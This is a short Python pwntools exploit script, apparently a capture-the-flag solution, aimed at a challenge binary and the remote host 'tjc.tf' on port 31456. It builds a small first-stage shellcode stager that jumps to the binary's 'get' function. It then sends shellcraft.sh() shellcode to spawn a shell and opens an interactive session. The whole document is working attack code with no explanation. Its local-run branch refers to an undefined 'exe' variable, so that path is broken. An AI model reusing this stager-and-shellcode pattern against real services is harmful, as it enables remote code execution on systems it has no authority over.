from pwn import *

e = ELF("./bin/out")

context.binary = e

context.terminal = ["tmux", "splitw", "-h"]

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("tjc.tf", 31456)

    return r

p = conn() #e.process()
#p = remote("localhost", 5000)
#push rbp; mov rbp rsp
payload = asm('mov edi, 0x100', arch='amd64', os='linux') \
    + asm("push rdx", arch='amd64', os='linux') \
    + asm("push "+str(e.symbols["get"]), arch='amd64', os='linux')\
    + asm("ret", arch='amd64', os='linux')

p.sendline(payload)

open("payload.dat","wb+").write(payload)

print(len(payload))

payload2 = asm(shellcraft.sh())

p.sendline(payload2)
p.interactive()
